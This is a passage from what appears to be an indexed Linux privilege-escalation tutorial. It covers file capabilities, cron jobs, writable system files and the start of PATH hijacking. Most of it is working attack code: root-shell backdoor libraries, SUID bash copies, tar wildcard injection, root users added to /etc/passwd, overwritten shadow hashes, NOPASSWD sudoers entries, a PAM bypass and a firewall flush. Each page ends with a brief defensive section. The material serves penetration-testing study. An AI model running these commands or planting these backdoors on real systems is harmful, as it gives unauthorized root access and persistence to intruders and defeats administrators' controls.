Sniff network traffic (requires Python with NET_RAW) python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW); print(s.recv(1024))' # Modify iptables iptables -F iptables -A INPUT -j ACCEPT # Open firewall 4. Capability Inheritance Exploitation When a process has capabilities, it can pass them to child processes. This creates attack chains. Scenario: A binary has cap_setuid+ep but doesn't spawn a shell directly. However, it might call external commands. Exploitation via Environment: # Create malicious library echo 'void __attribute__((constructor)) init() { setuid(0); system(\"/bin/sh\"); }' > exploit.c gcc -shared -fPIC exploit.c -o exploit.so # If binary honors LD_PRELOAD (uncommon for SUID, but possible with caps) LD_PRELOAD=./exploit.so /path/to/capability/binary 5. File vs. Running Process Capabilities File-based (persistent): # Grant capability to a file setcap cap_net_admin+ep /usr/bin/python3 # Remove capability setcap -r /usr/bin/python3 Process-based (runtime): # Run process with specific capabilities capsh --caps=\"cap_net_admin+ep\" -- -c \"/usr/bin/python3\" Note: File capabilities are persistent across reboots and affect all users. 6. Other Dangerous Capabilities Capability Description Exploit CAP_SYS_CHROOT chroot() system call Escape chroot via chroot(\".\") + pivot_root CAP_SYS_BOOT Reboot system reboot() CAP_SYS_TIME Change system clock Manipulate timestamps for forensics evasion CAP_SYS_NICE Change process priorities Denial of service CAP_SYS_RESOURCE Resource limits Set unlimited resources, DoS CAP_FOWNER Bypass file ownership checks Read/write any file CAP_MAC_ADMIN Override SELinux/AppArmor Disable MAC systems CAP_AUDIT_CONTROL Control audit subsystem Hide malicious activities 7. Practical Exploitation Workflow Step 1: Enumerate getcap -r / 2>/dev/null | tee capabilities.txt Step 2: Identify dangerous binaries # Look for common interpreters with caps cat capabilities.txt | grep -E \"python|perl|ruby|php|node|sh|bash\" # Focus on specific dangerous capabilities cat capabilities.txt | grep -E \"cap_setuid|cap_sys_admin|cap_dac_override|cap_sys_module\" Step 3: Exploit using GTFOBins or custom methods Example - Python with CAP_SETUID: # Check exact capabilities getcap /usr/bin/python3.11 # Output: /usr/bin/python3.11 = cap_setuid+ep # Exploit /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' Example - tar with CAP_DAC_OVERRIDE: # tar can read any file despite permissions tar -czf /tmp/out.tar.gz /etc/shadow # Works even if shadow is 000 Example - gdb with CAP_SYS_PTRACE: # Attach to PID 1 (init/systemd) and escalate gdb -p 1 (gdb) call system(\"exec /bin/bash 1>&0 2>&0\") 8. Automated Tools Capability-specific checks: # LinPEAS will check capabilities ./linpeas.sh | grep -i capabilities # Manual enumeration script for file in $(find / -type f -executable 2>/dev/null); do caps=$(getcap $file 2>/dev/null) if [ ! -z \"$caps\" ]; then echo \"$caps\" fi done 9. Defensive Measures For Administrators: Minimize capabilities: Only grant necessary capabilities Avoid interpreters: Never give capabilities to Python/Perl/Ruby interpreters Use noexec mounts: Prevents execution on sensitive partitions Monitor capabilities: Audit with getcap -r / regularly SELinux/AppArmor: Restrict capability usage further Remove capabilities: setcap -r /path/to/binary Secure example: # Instead of giving Python CAP_SETUID # Grant only to specific script with limited capabilities setcap cap_setuid+ep /usr/local/bin/safe_script.py # And ensure script is not writable by regular users chmod 755 /usr/local/bin/safe_script.py chown root:root /usr/local/bin/safe_script.py"},{"kind":"privesc","number":4,"order":204,"href":"privesc/04-cron-jobs.html","slug":"04-cron-jobs","page":"04-cron-jobs.html","title":"Cron Jobs","short":"Cron jobs","summary":"Inspect system and user schedules, then test writable jobs and wildcard risks.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":12,"words":1286,"sections":7,"codeBlocks":26,"headings":[{"id":"cron-jobs-for-privilege-escalation","text":"Cron Jobs for Privilege Escalation","level":2},{"id":"1-understanding-cron","text":"1. Understanding Cron","level":3},{"id":"2-enumeration-finding-cron-jobs","text":"2. Enumeration: Finding Cron Jobs","level":3},{"id":"3-exploitation-vectors","text":"3. Exploitation Vectors","level":3},{"id":"4-automated-exploitation","text":"4. Automated Exploitation","level":3},{"id":"5-advanced-techniques","text":"5. Advanced Techniques","level":3},{"id":"6-defensive-measures","text":"6. Defensive Measures","level":3}],"text":"Cron Jobs for Privilege Escalation Cron is the Linux task scheduler that runs commands and scripts at specified times. Cron jobs running as root are a prime privilege escalation vector when misconfigured, especially if the scripts or their parent directories are writable by lower-privileged users. 1. Understanding Cron What is Cron? System daemon that executes scheduled tasks Runs with the privileges of the user who owns the crontab Root-owned cron jobs run with full root privileges Typically runs scripts for backups, log rotation, system maintenance, etc. Cron File Locations: Location Description /etc/crontab System-wide crontab (specifies user to run as) /etc/cron.d/ System-wide cron files /etc/cron.hourly/ Scripts run every hour /etc/cron.daily/ Scripts run daily /etc/cron.weekly/ Scripts run weekly /etc/cron.monthly/ Scripts run monthly /var/spool/cron/crontabs/ User-specific crontabs (Debian/Ubuntu) /var/spool/cron/ User-specific crontabs (RHEL/CentOS) /etc/cron.allow Users allowed to use cron (if exists) /etc/cron.deny Users denied from using cron 2. Enumeration: Finding Cron Jobs List all cron jobs for current user: crontab -l List root's cron jobs: sudo crontab -l Find all cron files: ls -la /etc/cron* cat /etc/crontab cat /etc/cron.d/* 2>/dev/null # User crontabs ls -la /var/spool/cron/crontabs/ 2>/dev/null ls -la /var/spool/cron/ 2>/dev/null # Directory scripts ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ Check for cron scripts in other locations: # Look for scripts that might be called by cron find / -name \"*.sh\" -exec grep -l \"cron\\|daily\\|weekly\\|hourly\" {} \\; 2>/dev/null # Check for custom cron directories find /etc -name \"*cron*\" -type d 2>/dev/null Monitor running cron jobs: # View cron logs tail -f /var/log/syslog | grep CRON tail -f /var/log/cron journalctl -u cron -f # See what's currently running ps aux | grep cron 3. Exploitation Vectors A. Writable Cron Scripts (Most Common) If a cron job executes a script that is writable by a lower-privileged user, that user can modify the script to execute arbitrary commands as root. Example Scenario: Root cron runs: /usr/local/bin/backup.sh every hour Script is world-writable: -rwxrwxrwx 1 root root Attacker modifies the script: echo '#!/bin/bash chmod +s /bin/bash echo \"hacked\" > /tmp/flag' > /usr/local/bin/backup.sh When cron runs, /bin/bash becomes SUID root Complete Exploit Workflow: # 1. Find writable cron scripts find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null find / -path /proc -prune -o -type f -name \"*.sh\" -writable -exec ls -la {} \\; 2>/dev/null # 2. Identify if it's executed by root cat /etc/crontab | grep writable_script # 3. Inject payload echo '#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash' >> /path/to/writable/script.sh # 4. Wait for cron to execute (or trigger manually if possible) /tmp/rootbash -p # Get root shell B. Writable Cron Directories If a cron directory (like /etc/cron.daily/) is writable, an attacker can add a new script. Exploitation: # Check directory permissions ls -ld /etc/cron.daily/ # Output: drwxrwxrwx 2 root root # Create malicious script echo '#!/bin/bash chmod +s /bin/bash' > /etc/cron.daily/exploit.sh chmod +x /etc/cron.daily/exploit.sh # Wait for execution Note: The script must be executable (chmod +x) and typically needs to have no extension restrictions (depends on system configuration). C. PATH Hijacking in Cron If a cron script uses a command without an absolute path (e.g., backup instead of /usr/local/bin/backup), cron's PATH can be exploited. Exploitation: # 1. Check cron's PATH (in /etc/crontab) cat /etc/crontab # Output: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # 2. Find a cron script that calls commands without full path cat /etc/cron.daily/logrotate # Output: compress_logs # No absolute path # 3. Create a malicious binary in a PATH directory that's writable echo '#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash' > /usr/local/bin/compress_logs chmod +x /usr/local/bin/compress_logs # 4. Wait for cron to run Alternative: If a writable directory is earlier in PATH than the legitimate binary location, hijacking is possible: # Add /tmp to front of PATH for cron (if cron uses system PATH) export PATH=/tmp:$PATH # Doesn't work for cron normally Cron-specific PATH: If using /etc/crontab, PATH is defined there. If using user crontabs, PATH is defined in the user's environment. D. Wildcard Injection in Cron Scripts When a cron script uses wildcards (*) in commands like tar, chown, or rm, an attacker can create files with special filenames that execute arbitrary commands. Classic Example - Tar Wildcard Exploit: # Cron job doing: tar -czf /backup/backup.tgz /var/www/* # Attacker in /var/www/: touch -- '--checkpoint=1' touch -- '--checkpoint-action=exec=sh exploit.sh' echo '#!/bin/bash chmod +s /bin/bash' > exploit.sh chmod +x exploit.sh # When cron runs tar, the wildcard expands to: tar -czf /backup/backup.tgz /var/www/--checkpoint=1 --checkpoint-action=exec=sh\\ exploit.sh # Tar executes exploit.sh as root Other Dangerous Commands with Wildcards: rm -rf /path/* → Create --no-preserve-root to delete everything chown -R user:group /path/* → Create --reference=somefile to change ownership cp -r /path/* /dest/ → Create --preserve=all options Mitigation: Always quote wildcards: \"$@\" instead of $@, or use -- to end options: tar -czf /backup/backup.tgz -- /var/www/* E. Symbolic Link Attacks (TOCTOU) Time of Check to Time of Use (TOCTOU) vulnerability where a cron script checks a file's permissions, then uses it, but the file is swapped in between. Example: If a cron script does: if [ -w /tmp/data ]; then cat /tmp/data >> /var/log/secure.log fi Exploitation: # Create a symlink to /etc/shadow ln -s /etc/shadow /tmp/data # Wait for cron to check (will pass if data is writable? No, check fails) # Better: Create a file /tmp/data, then in the race window, replace with symlink More dangerous: If cron uses chown or chmod recursively: # Cron does: chown -R root:root /tmp/process_data/ # Attacker creates symlink in /tmp/process_data/ pointing to /etc/passwd # When cron runs, it changes ownership of /etc/passwd to root:root (already root, but could be other targets) F. Anacron Jobs Anacron runs jobs that might be missed if system is off. Similar vulnerabilities apply. Locations: /etc/anacrontab /var/spool/anacron/ G. Systemd Timers (Modern Cron) Modern systems often use systemd timers instead of cron. These can also be exploited. Enumerate: # List all timers systemctl list-timers --all # Check timer details systemctl status \u003ctimer>.timer # Find writable service files find /etc/systemd/system/ -name \"*.service\" -writable 2>/dev/null Exploitation: If a timer's service file is writable, modify it to execute commands: # Edit service file vim /etc/systemd/system/backup.service # Add: ExecStart=/bin/bash -c 'chmod +s /bin/bash' # Reload and restart systemctl daemon-reload systemctl restart backup.service 4. Automated Exploitation Tools to identify cron misconfigurations: # LinPEAS cron checks ./linpeas.sh | grep -A 10 \"Cron Jobs\" # LinEnum ./linenum.sh | grep -i cron # Custom quick check for cron_file in /etc/crontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/*; do [ -f \"$cron_file\" ] && echo \"=== $cron_file ===\" && cat \"$cron_file\" done 5. Advanced Techniques A. Script Dependencies If a cron script includes or sources other files: # Cron script does: source /etc/config/backup.conf # Attacker writes to /etc/config/backup.conf (if writable) echo 'chmod +s /bin/bash' >> /etc/config/backup.conf B. Command Injection in Variables If cron script uses user-controlled input: # Cron script: zip -r backup.zip $(cat /tmp/filelist.txt) # Attacker writes to /tmp/filelist.txt: ; chmod +s /bin/bash; 6. Defensive Measures For System Administrators: Proper Permissions: # Restrict cron directories chmod 755 /etc/cron.daily/ chmod 644 /etc/crontab chown root:root /etc/crontab # Make cron scripts non-writable chmod 755 /usr/local/bin/backup.sh chown root:root /usr/local/bin/backup.sh Use Absolute Paths: # Bad * * * * * root backup_script # Good * * * * * root /usr/local/bin/backup_script Avoid Wildcards in Destructive Commands: # Bad tar -czf backup.tgz /var/www/* # Better tar -czf backup.tgz /var/www -- # Still risky # Best tar -czf backup.tgz /var/www/html /var/www/images Use -- to End Options: tar -czf backup.tgz -- /var/www/* # Ignores filenames starting with - Separate Cron Directories: # Use separate directory for cron scripts mkdir /opt/cron_scripts/ chown root:root /opt/cron_scripts/ chmod 750 /opt/cron_scripts/ Monitor and Alert: # Audit cron changes auditctl -w /etc/crontab -p wa -k cron_change auditctl -w /etc/cron.d/ -p wa -k cron_change # Email alerts on changes # Use AIDE/Tripwire for integrity checking Restrict Cron Access: # Allow only specific users echo \"root\" > /etc/cron.allow echo \"admin\" >> /etc/cron.allow"},{"kind":"privesc","number":5,"order":205,"href":"privesc/05-writable-system-files.html","slug":"05-writable-system-files","page":"05-writable-system-files.html","title":"Writable System Files","short":"Writable files","summary":"Audit writable configuration, scripts and authentication files that root trusts.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":17,"words":1791,"sections":13,"codeBlocks":38,"headings":[{"id":"writable-system-files-for-privilege-escalation","text":"Writable System Files for Privilege Escalation","level":2},{"id":"1-understanding-the-attack-surface","text":"1. Understanding the Attack Surface","level":3},{"id":"2-enumeration-finding-writable-system-files","text":"2. Enumeration: Finding Writable System Files","level":3},{"id":"3-writable-scripts-sh-py-pl-rb","text":"3. Writable Scripts (.sh, .py, .pl, .rb)","level":3},{"id":"4-writable-configuration-files","text":"4. Writable Configuration Files","level":3},{"id":"5-writable-profile-and-environment-files","text":"5. Writable Profile and Environment Files","level":3},{"id":"6-writable-directories-with-dynamic-loading","text":"6. Writable Directories with Dynamic Loading","level":3},{"id":"7-writable-log-files-command-injection","text":"7. Writable Log Files (Command Injection)","level":3},{"id":"8-suid-binary-with-writable-library-dependencies","text":"8. SUID Binary with Writable Library Dependencies","level":3},{"id":"9-writable-kernel-modules","text":"9. Writable Kernel Modules","level":3},{"id":"10-writable-devices-and-special-files","text":"10. Writable Devices and Special Files","level":3},{"id":"11-practical-exploitation-workflow","text":"11. Practical Exploitation Workflow","level":3},{"id":"12-defensive-measures","text":"12. Defensive Measures","level":3}],"text":"Writable System Files for Privilege Escalation System files that are writable by non-root users represent a critical privilege escalation vector. When root executes scripts or reads configuration files that lower-privileged users can modify, attackers can inject malicious code, alter system behavior, or gain root access. This is often overlooked during system hardening. 1. Understanding the Attack Surface Core Concept: Any system file that root uses and a non-root user can modify is a potential escalation path. The exploitation typically involves: Scripts: Inject malicious code that root executes Configuration files: Alter settings to execute arbitrary commands Log files: Manipulate to trigger command execution Library files: Hijack function calls Binary files: Replace or modify executables Why This Works: Root trusts system files by default. If a file is writable, root will execute/modify it without checking permissions, executing attacker-controlled code. 2. Enumeration: Finding Writable System Files Comprehensive Search: find / -type f -perm -0002 -path /proc -prune -o -exec ls -la {} \\; 2>/dev/null # Find files writable by current user find / -type f -writable ! -user root -exec ls -la {} \\; 2>/dev/null # Focus on critical system directories find /bin /sbin /usr/bin /usr/sbin /etc /lib /usr/lib -type f -writable 2>/dev/null # Find world-writable scripts find / -type f -name \"*.sh\" -perm -0002 -exec ls -la {} \\; 2>/dev/null find / -type f -name \"*.py\" -perm -0002 -exec ls -la {} \\; 2>/dev/null # Find writable files in cron directories find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null # Check for writable configuration files find /etc -type f -writable ! -user root 2>/dev/null | grep -v \"/etc/passwd\\|/etc/shadow\" Automated Tools: # LinPEAS will highlight writable files ./linpeas.sh | grep -E \"Writable|Writeable\" -A 5 # Manual check with colorized output find / -type f -writable 2>/dev/null | while read file; do echo -e \"\\033[31m[WRITABLE]\\033[0m $file\" done 3. Writable Scripts (.sh, .py, .pl, .rb) A. System Scripts in PATH If a script in /bin, /usr/bin, or /usr/local/bin is writable, root might execute it. Exploitation: # Find writable scripts in PATH for dir in $(echo $PATH | tr ':' ' '); do find $dir -type f -writable -exec ls -la {} \\; 2>/dev/null done # Example: /usr/local/bin/backup.sh is world-writable echo '#!/bin/bash chmod +s /bin/bash cp /bin/bash /tmp/shell chmod +s /tmp/shell' >> /usr/local/bin/backup.sh # Wait for root to execute it, then: /tmp/shell -p # Root shell Note: Even if the script isn't directly run by root, it might be: Called from a cron job Included (source) in another script Used during system startup Called by other system services B. Writable Init Scripts System initialization scripts in /etc/init.d/, /etc/rc.d/, or systemd unit files. Exploitation: # Check writable init scripts find /etc/init.d/ -type f -writable 2>/dev/null # Modify service script echo '#!/bin/sh chmod +s /bin/bash' >> /etc/init.d/malicious_service # Trigger service restart or wait for reboot systemctl restart malicious_service # Or wait for system startup Systemd Services: # Find writable service files find /etc/systemd/system/ -name \"*.service\" -writable 2>/dev/null find /lib/systemd/system/ -name \"*.service\" -writable 2>/dev/null # Modify service vim /etc/systemd/system/some.service # Add: ExecStartPre=/bin/bash -c 'chmod +s /bin/bash' # Reload and restart systemctl daemon-reload systemctl restart some.service 4. Writable Configuration Files A. /etc/sudoers (Most Critical) If /etc/sudoers is writable, escalate immediately. Exploitation: # Check permissions ls -la /etc/sudoers # Output: -rw-rw-r-- 1 root root (writable by group) # Add yourself to sudoers (needs proper syntax) echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers # Or use visudo to validate sudo bash # Direct root Note: Modern systems have /etc/sudoers.d/ which might be more permissive: # Check directory permissions ls -ld /etc/sudoers.d/ # If writable: echo 'user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/user B. /etc/passwd and /etc/shadow If writable, add a new root user or change root password. Exploitation: # Generate password hash openssl passwd -1 -salt abc password123 # Output: $1$abc$0J/2wzDqgVX6j.GL5hH3X. # Add new root user echo 'hacker:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:0:0:Hacker:/root:/bin/bash' >> /etc/passwd # Now: su hacker (password: password123) /etc/shadow: # If writable, change root password hash # Backup original cp /etc/shadow /tmp/shadow.bak # Replace root's hash with your own echo 'root:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:19000:0:99999:7:::' > /etc/shadow # Now: su root (password: password123) C. PAM Configuration (/etc/pam.d/) PAM modules control authentication. A writable PAM config can bypass authentication. Exploitation: # Check permissions ls -la /etc/pam.d/common-auth # Modify to always succeed echo 'auth sufficient pam_permit.so' >> /etc/pam.d/common-auth echo 'auth required pam_unix.so' >> /etc/pam.d/common-auth # Now any login works D. SSH Configuration (/etc/ssh/sshd_config) Enable root login, password authentication, or run custom commands. Exploitation: # Enable root login echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config # Force command on login echo 'ForceCommand /bin/bash -c \"chmod +s /bin/bash && /bin/bash\"' >> /etc/ssh/sshd_config # Restart SSH systemctl restart ssh E. /etc/ld.so.conf and /etc/ld.so.conf.d/ Controls library search paths. Adding a directory can hijack shared libraries. Exploitation: # Add malicious library directory echo '/tmp/malicious_libs' >> /etc/ld.so.conf ldconfig # Create malicious libc gcc -shared -fPIC -o /tmp/malicious_libs/libc.so.6 malicious.c # Any program using libc will load our malicious library Risk Level: Extremely high - affects almost all system processes. 5. Writable Profile and Environment Files A. /etc/profile, /etc/bash.bashrc, /etc/profile.d/ Global shell initialization scripts executed for every login (including root). Exploitation: # Check permissions ls -la /etc/profile # If writable: echo '#!/bin/bash chmod +s /bin/bash rm -f /tmp/backdoor cp /bin/bash /tmp/backdoor chmod +s /tmp/backdoor' >> /etc/profile # Wait for root login, or trigger: su - root # /tmp/backdoor -p gives root shell Bashrc Example: echo 'alias sudo=\"chmod +s /bin/bash\"' >> /etc/bash.bashrc # When root types sudo, it executes instead B. User-specific Profile Files If you can write to root's home directory. Exploitation: # If root's .bashrc is writable echo 'chmod +s /bin/bash' >> /root/.bashrc # Wait for root login or su - root Note: Root's home is usually /root with strict permissions (750/700). But misconfigurations happen. 6. Writable Directories with Dynamic Loading A. /etc/ld.so.preload Preloads libraries before any program starts. One of the most dangerous writable files. Exploitation: # Create malicious library cat > /tmp/backdoor.c \u003c\u003c 'EOF' #include \u003cstdio.h> #include \u003cunistd.h> #include \u003csys/types.h> __attribute__((constructor)) void init() { setuid(0); system(\"/bin/bash\"); } EOF gcc -shared -fPIC /tmp/backdoor.c -o /tmp/backdoor.so # Add to ld.so.preload echo '/tmp/backdoor.so' > /etc/ld.so.preload # Next SUID program executed gives root shell sudo ls # Or any SUID binary Persistent Backdoor: # Add to /etc/ld.so.preload for permanent backdoor echo '/tmp/backdoor.so' >> /etc/ld.so.preload B. Python/Perl/Ruby Site Packages If system site-packages directories are writable. Exploitation - Python: # Find writable site-packages find /usr/lib/python* -type d -writable 2>/dev/null # Override system module cat > /usr/lib/python3/dist-packages/requests/__init__.py \u003c\u003c 'EOF' import os os.system(\"chmod +s /bin/bash\") EOF # Any Python script using 'requests' executes as root # If system service uses it, privilege escalation 7. Writable Log Files (Command Injection) Some log files are processed by root scripts. Injecting log entries can lead to command injection. Example - /var/log/auth.log: # If log file is processed by a cron script: # Cron script might grep logs and run commands # Inject command echo 'malicious_command' >> /var/log/auth.log # Cron script executes the log content Practical Scenario: # Cron script doing: grep \"ERROR\" /var/log/app.log | while read line; do $line; done # Attacker writes to /var/log/app.log: echo 'chmod +s /bin/bash' >> /var/log/app.log # Cron executes it as root 8. SUID Binary with Writable Library Dependencies If an SUID binary uses a shared library that's writable. Exploitation: # Find SUID binary find / -perm -4000 -type f 2>/dev/null # Check its library dependencies ldd /usr/bin/suid_binary # If a library is writable: vim /lib/libssl.so.1.1 # Add malicious code in library constructor Caveat: Libraries often get replaced during updates. Persistent backdoor requires more work. 9. Writable Kernel Modules If kernel modules (.ko files) are writable, root can be escalated. Exploitation: # Find writable kernel modules find /lib/modules/ -name \"*.ko\" -writable 2>/dev/null # Create malicious module # Or modify existing module to execute code on load # Load modified module insmod /path/to/malicious_module.ko 10. Writable Devices and Special Files A. /dev/mem (Writable Memory) If writable, can modify kernel memory. Exploitation: # Check permissions ls -la /dev/mem # If writable, use memory manipulation tools B. /dev/shm Writable shared memory that root scripts might use. Exploitation: # Cron script reads from /dev/shm/tempfile echo 'chmod +s /bin/bash' > /dev/shm/tempfile # Cron executes content 11. Practical Exploitation Workflow Step 1: Identify All Writable System Files: # Comprehensive enumeration find / -type f -writable ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"/dev/*\" 2>/dev/null | tee writable_files.txt # Filter for critical files grep -E \"/etc/|/bin/|/usr/bin/|/usr/sbin/|/lib/|/usr/lib/|/var/spool/cron|/etc/cron\" writable_files.txt | tee critical_writable.txt Step 2: Prioritize Based on Likely Root Execution: # Check cron files (run as root) find /etc/cron* -type f -writable 2>/dev/null # Check init scripts (run at boot or service start) find /etc/init.d/ -type f -writable 2>/dev/null # Check systemd units find /etc/systemd/system -name \"*.service\" -writable 2>/dev/null # Check PATH scripts for dir in $(echo $PATH | tr ':' ' '); do find $dir -type f -writable 2>/dev/null; done Step 3: Determine Execution Context: # Search for references to the file in root-owned scripts grep -r \"writable_script.sh\" /etc/ /var/spool/cron/ 2>/dev/null # Check if file is used by any service systemctl list-dependencies | grep writable_script Step 4: Inject Payload: # For scripts: append shell escape echo '#!/bin/bash chmod +s /bin/bash' >> /path/to/writable_script # For configs: add malicious directives echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/user Step 5: Trigger Execution: # Wait for cron # Restart service systemctl restart servicename # Trigger via other user activity # Force reboot (if script is startup) Step 6: Verify Escalation: # Check if /bin/bash has SUID bit ls -la /bin/bash # Execute with -p to preserve privileges /bin/bash -p # Or use backup shell /tmp/backdoor -p 12. Defensive Measures For System Administrators: Regular Audits: # Daily scan for new writable files find /etc /bin /usr/bin /sbin /usr/sbin /lib /usr/lib -type f -writable ! -user root -ls 2>/dev/null # Integrate into monitoring Strict Permissions: # Reset permissions on system directories chmod 755 /etc /bin /usr/bin /sbin /usr/sbin /lib /usr/lib chmod 644 /etc/passwd /etc/shadow /etc/sudoers chmod 644 /etc/crontab /etc/ld.so.conf # Remove world-writable permissions find / -type f -perm -0002 -exec chmod o-w {} \\; Immutable Files: # Protect critical files chattr +i /etc/passwd chattr +i /etc/shadow chattr +i /etc/sudoers chattr +i /etc/crontab # Only root can modify with chattr -i Filesystem Mount Options: # Mount /tmp and /var/tmp with noexec,nosuid mount -o remount,noexec,nosuid /tmp mount -o remount,noexec,nosuid /var/tmp Integrity Checking: # Use AIDE or Tripwire aide --init aide --check # Debian/Ubuntu: debsums debsums -c # Check for modified files SELinux/AppArmor: # Enable SELinux to restrict file access setenforce 1 # Or AppArmor aa-enforce /etc/apparmor.d/* Monitor Write Attempts: # Auditd rules for file writes auditctl -w /etc/ -p wa -k system_config auditctl -w /bin/ -p wa -k bin_changes auditctl -w /usr/bin/ -p wa -k usr_bin_changes Secure Cron Directories: # Restrict cron directories chmod 755 /etc/cron.d chmod 755 /etc/cron.hourly chmod 755 /etc/cron.daily chmod 755 /etc/cron.weekly chmod 755 /etc/cron.monthly"},{"kind":"privesc","number":6,"order":206,"href":"privesc/06-path-hijacking.html","slug":"06-path-hijacking","page":"06-path-hijacking.html","title":"PATH Hijacking","short":"PATH hijacking","summary":"Trace command lookup order and test PATH assumptions in privileged jobs.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":17,"words":1949,"sections":8,"codeBlocks":36,"headings":[{"id":"path-hijacking-for-privilege-escalation","text":"PATH Hijacking for Privilege Escalation","level":2},{"id":"1-understanding-path","text":"1. Understanding PATH","level":3},{"id":"2-enumeration-identifying-path-hijacking-opportunities","text":"2. Enumeration: Identifying PATH Hijacking Opportunities","level":3},{"id":"3-exploitation-techniques","text":"3. Exploitation Techniques","level":3},{"id":"4-advanced-techniques","text":"4. Advanced Techniques","level":3},{"id":"5-practical-attack-workflow","text":"5. Practical Attack Workflow","level":3},{"id":"6-exploitable-scenarios","text":"6. Exploitable Scenarios","level":3},{"id":"7-defensive-measures","text":"7. Defensive Measures","level":3}],"text":"PATH Hijacking for Privilege Escalation PATH hijacking exploits the way Linux searches for executables when a command is called without an absolute path. If a root-owned process or script calls a command like ls instead of /bin/ls, an attacker can manipulate the PATH environment variable to execute a malicious binary with root privileges instead. 1. Understanding PATH What is PATH? Environment variable that tells the shell where to look for executables Colon-separated list of directories: /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin Search order is left to right (first match wins) Critical for privilege escalation when root processes rely on it View Current PATH: echo $PATH How Command Resolution Works: # When you type 'ls', the system: # 1. Checks if 'ls' is an alias/built-in # 2. Searches PATH directories in order: # /usr/local/sbin/ls (not found) # /usr/local/bin/ls (not found) # /usr/sbin/ls (not found) # /usr/bin/ls (found! executes this) 2. Enumeration: Identifying PATH Hijacking Opportunities Check Current PATH: echo $PATH | tr ':' '\\n' | nl # Shows each directory with priority Find Writable Directories in PATH: # Check if any PATH directory is writable by current user for dir in $(echo $PATH | tr ':' ' '); do if [ -w \"$dir\" ]; then echo \"[WRITABLE] $dir\" fi done Check for Relative Paths in Cron Jobs: # Look for commands without absolute paths cat /etc/crontab | grep -v '^#' | grep -v '^$' # Example: * * * * * root backup_script # Uses PATH! # Examine cron scripts grep -r \" [a-z]\" /etc/cron* | grep -v \"^#\" | grep -v \"full path\" Find Scripts with Dangerous Commands: # Search for common commands without full paths grep -r \"cp \" /etc/init.d/ 2>/dev/null grep -r \"mv \" /etc/init.d/ 2>/dev/null grep -r \"rm \" /etc/init.d/ 2>/dev/null grep -r \"chmod \" /etc/init.d/ 2>/dev/null grep -r \"chown \" /etc/init.d/ 2>/dev/null Check SUID Binaries' Dependencies: # Find SUID binaries that call external commands strings /path/to/suid_binary | grep -E \"^[a-z]+$\" # Look for 'system(\"command\")' or 'execvp(\"command\")' Automated Tools: # LinPEAS PATH checks ./linpeas.sh | grep -A 10 \"PATH\" # Manual comprehensive check for script in $(find /etc/cron* /etc/init.d/ -type f 2>/dev/null); do echo \"=== $script ===\" grep -E \"(^|[^/])[a-zA-Z0-9_-]+\" $script | grep -v \"/\" | head -10 done 3. Exploitation Techniques A. Writable PATH Directory Hijack (Most Common) If a directory in PATH is writable, put a malicious binary with the same name as a command root uses. Exploitation: # 1. Check which PATH directories are writable for dir in $(echo $PATH | tr ':' ' '); do if [ -w \"$dir\" ]; then echo \"[+] Writable: $dir\" fi done # 2. Find a command called by root without absolute path # Example: Cron job does: backup_script (not /usr/local/bin/backup_script) # 3. Create malicious binary in the *earliest* writable PATH directory echo '#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash # Execute the real command to avoid breaking functionality /usr/bin/backup_script \"$@\"' > /usr/local/bin/backup_script chmod +x /usr/local/bin/backup_script # 4. Wait for cron/root to execute # 5. /tmp/rootbash -p gives root Priority Matters: # If PATH is: /usr/local/bin:/usr/bin:/bin # And /usr/local/bin is writable, create malicious binary there # If not, check /usr/bin, /bin (usually not writable) # To see exact PATH used by cron: cat /etc/crontab | grep PATH # You can also check: sudo crontab -l | grep PATH B. Adding New PATH Directory (If Cron Uses System PATH) If you can't modify existing PATH directories, but cron uses a writable directory that's not in PATH (and you can add it). Exploitation: # 1. Create writable directory mkdir /tmp/bin chmod 755 /tmp/bin # 2. Modify PATH for cron (if using /etc/crontab) echo \"PATH=/tmp/bin:$PATH\" >> /etc/crontab # Or if using cron.d files echo \"PATH=/tmp/bin:/usr/local/bin:/usr/bin:/bin\" > /etc/cron.d/path # 3. Place malicious binary cat > /tmp/bin/backup \u003c\u003c 'EOF' #!/bin/bash cp /bin/bash /tmp/shell chmod +s /tmp/shell EOF chmod +x /tmp/bin/backup # 4. Wait for execution Note: This requires writing to /etc/crontab (usually root-only). More common in misconfigured systems where cron.d is writable. C. User-Specific PATH Manipulation If a user can modify their own .bashrc or .profile, and root executes commands as that user (or sudo -u), PATH hijacking works. Exploitation: # Modify user's .bashrc echo 'export PATH=/tmp/bin:$PATH' >> ~/.bashrc # Create malicious binary mkdir /tmp/bin echo '#!/bin/bash chmod +s /bin/bash' > /tmp/bin/ls chmod +x /tmp/bin/ls # Wait for root to execute a command as this user sudo -u user some_command # Or if root su's to this user D. Symlink Attacks on PATH Directories If a PATH directory is writable but you can't create files (e.g., parent permissions), symlinks might work. Exploitation: # If /usr/local/bin is writable but you can't write files # Create symlink to your malicious script in another location ln -s /tmp/backdoor.sh /usr/local/bin/backup # Or if you can't write to /usr/local/bin at all, but can write to parent # symlink the whole directory ln -s /tmp/fake_bin /usr/local/bin E. Exploiting SUID Binaries with PATH Dependencies Some SUID binaries spawn processes using system commands without absolute paths. Exploitation: # 1. Find SUID binary that uses system() find / -perm -4000 -type f -exec strings {} \\; 2>/dev/null | grep 